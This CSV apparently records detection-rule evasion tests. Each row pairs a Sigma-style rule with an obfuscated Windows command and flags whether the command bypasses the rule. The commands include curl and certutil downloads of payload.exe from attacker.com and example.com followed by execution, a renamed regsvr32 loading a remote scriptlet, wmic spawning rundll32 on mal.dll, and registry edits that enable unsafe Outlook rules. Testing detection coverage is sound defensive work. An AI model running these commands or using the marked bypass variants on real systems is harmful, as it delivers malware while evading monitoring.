Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:ON /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:oN /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:on /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /""V:ON"" /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:ON /C ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1114,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"cmd.exe /c ""reg add HKCU\Software\Microsoft\Office\16.0\Outlook\Security /v EnableUn^safeClientMailRules /t REG_DWORD /d 1 /f""",TRUE,TRUE,TRUE,
t1114,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"reg.exe add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v EnableUnsafeClientMailRules /t REG_DWORD /d 1 /f",TRUE,TRUE,TRUE,
t1114,proc_creation_win_webdav_lnk_execution,Potentially Suspicious WebDAV LNK Execution,1412aa78-a24c-4abd-83df-767dfb2c5bbe,,"wmic.exe process call create ""\\192.168.1.50\DavWWWRoot\share\payload.exe""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_susp_lnk_exec_hidden_cmd,Suspicious LNK Command-Line Padding with Whitespace Characters,dd8756e7-a3a0-4768-b47e-8f545d1a751c,,"C:\Windows\System32\cmd.exe /c ""certutil.exe -urlcache -f http://attacker.com/payload.exe C:\temp\p.exe && C:\temp\p.exe""",TRUE,TRUE,FALSE,Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1114,proc_creation_win_susp_lnk_exec_hidden_cmd,Suspicious LNK Command-Line Padding with Whitespace Characters,dd8756e7-a3a0-4768-b47e-8f545d1a751c,,"C:\Windows\System32\cmd.exe /c ""powershell.exe -Command Write-Host 'Malicious Payload Executed'""",TRUE,TRUE,TRUE,
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"cmd.exe /c copy C:\Windows\System32\regsvr32.exe %TEMP%\updater.exe && wmic process call create ""%TEMP%\updater.exe /s /i:http://10.0.0.5/payload.sct scrobj.dll""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //Nologo C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /""c"" set __COMPAT_LAYER= && wscript.exe //e:jSCRiPt -""/Nologo"" C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /""c"" set __COMPAT_LAYER= && wscript.exe //E:jscript //nolOgO C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /c set __COMPAT_LAYER= && wscript.exe -""/E:jscript"" //Nologo C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /""c"" set __COMPAT_LAYER= && wscript.exe //E:jscript //NoLOGO C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript /""/Nologo"" C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /C set __COMPAT_LAYER= && wscript.exe /""/E:jscript"" //Nologo C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //nOloGo C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe -""c"" set __COMPAT_LAYER= && wscript.exe /""/E:jscript"" -""/Nologo"" C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe -""c"" set __COMPAT_LAYER= && wscript.exe /""/E:jscript"" //Nologo C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /""c"" set __COMPAT_LAYER= && wscript.exe -""/E:jscript"" -""/Nologo"" C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /s /n /u""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /""s"" /n -""u""""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /S /N /u""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /""s"" /""n"" /u""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /s /N /u""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /s /N /U""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer -""s"" -""n"" /U""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer -""s"" /N /u""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /s /n /""u""""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /s /n -""u""""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1114,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""rundll32.exe C:\ProgramData\mal.dll,DllRegisterServer /s /""n"" /""u""""",TRUE,TRUE,FALSE,Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1204.002,proc_creation_win_susp_lnk_exec_hidden_cmd,Suspicious LNK Command-Line Padding with Whitespace Characters,dd8756e7-a3a0-4768-b47e-8f545d1a751c,,"C:\Windows\System32\cmd.exe /c ""certutil.exe -urlcache -f http://attacker.com/payload.exe C:\temp\p.exe && C:\temp\p.exe""",TRUE,TRUE,FALSE,Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1204.002,proc_creation_win_susp_lnk_exec_hidden_cmd,Suspicious LNK Command-Line Padding with Whitespace Characters,dd8756e7-a3a0-4768-b47e-8f545d1a751c,,"C:\Windows\System32\cmd.exe /c ""powershell.exe -Command Write-Host 'Malicious Payload Executed'""",TRUE,TRUE,TRUE,
t1204.002,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"cmd.exe /c copy C:\Windows\System32\regsvr32.exe %TEMP%\updater.exe && wmic process call create ""%TEMP%\updater.exe /s /i:http://10.0.0.5/payload.sct scrobj.dll""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1204.002,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //Nologo C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1204.002,proc_creation_win_wmic_susp_execution_via_office_process,Suspicious WMIC Execution Via Office Process,e1693bc8-7168-4eab-8718-cdcaa68a1738,,"wmic process call create ""cmd.exe /""c"" set __COMPAT_LAYER= && wscript.exe //e:jSCRiPt -""/Nologo"" C:\Users\Public\impl.js""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
